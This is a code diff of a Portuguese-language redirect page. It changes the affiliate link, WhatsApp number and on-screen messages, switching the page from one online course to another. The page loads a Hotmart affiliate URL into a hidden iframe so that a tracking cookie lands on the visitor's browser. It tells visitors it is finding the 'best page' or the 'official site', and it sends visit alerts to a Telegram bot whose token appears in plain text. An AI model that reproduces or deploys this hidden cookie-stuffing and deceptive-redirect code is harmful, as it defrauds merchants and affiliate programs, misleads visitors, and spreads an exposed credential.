@@ -51,17 +51,17 @@
 <body>
 
   <div class="circle"></div>
-  <div id="message" class="text">Espere! Você está na Fila de Atendimento</div>
+  <div id="message" class="text">Espere! Procurando pela Melhor Página</div>
 
   <iframe id="cookieFrame" src="" style="display:none;"></iframe>
 
   <div id="fallback">
-    Se não for redirecionado, <a href="https://api.whatsapp.com/send?phone=5561996574523&text=Ol%C3%A1%2C%20preciso%20de%20ajuda%20com%20o%20Curso%20Contabilidade%206%20em%201">clique aqui</a>.
+    Se não for redirecionado, <a href="https://api.whatsapp.com/send?phone=5511996951230&text=Ol%C3%A1%2C%20preciso%20de%20ajuda%20com%20o%20Curso%20TerapiaPlay">clique aqui</a>.
   </div>
 
   <script>
-    const cookieURL = "https://go.hotmart.com/N97608406F?dp=1";
-    const checkoutURL = "https://api.whatsapp.com/send?phone=5561996574523&text=Ol%C3%A1%2C%20preciso%20de%20ajuda%20com%20o%20Curso%20Contabilidade%206%20em%201";
+    const cookieURL = "https://go.hotmart.com/W100361047X?dp=1";
+    const checkoutURL = "https://api.whatsapp.com/send?phone=5511996951230&text=Ol%C3%A1%2C%20preciso%20de%20ajuda%20com%20o%20Curso%20TerapiaPlay";
 
     const NumeroTLG = '7674575961:AAGSl6HVhZJhymoedLgBMESc9rPF88Q98Es';
     const CanalTLG = '5493027377';
@@ -82,7 +82,7 @@
     setTimeout(() => {
       msg.style.opacity = 0;
       setTimeout(() => {
-        msg.textContent = "Redirecionando para Equipe de Suporte";
+        msg.textContent = "Redirecionando para Site Oficial";
         msg.style.opacity = 1;
       }, 400);
     }, 3000);
@@ -106,7 +106,7 @@
 
     setTimeout(() => {
       if (!cookieConfirmado) {
-        enviarAlerta(`⛔ Acesso detectado! Erro ao marcar o usuário\nPágina: ${checkoutURL}`);
+        enviarAlerta(`⛔ Acesso detectado! Erro ao marcar usuário\nPágina: ${checkoutURL}`);
         document.getElementById("fallback").style.display = "block";
       }
     }, 8000);
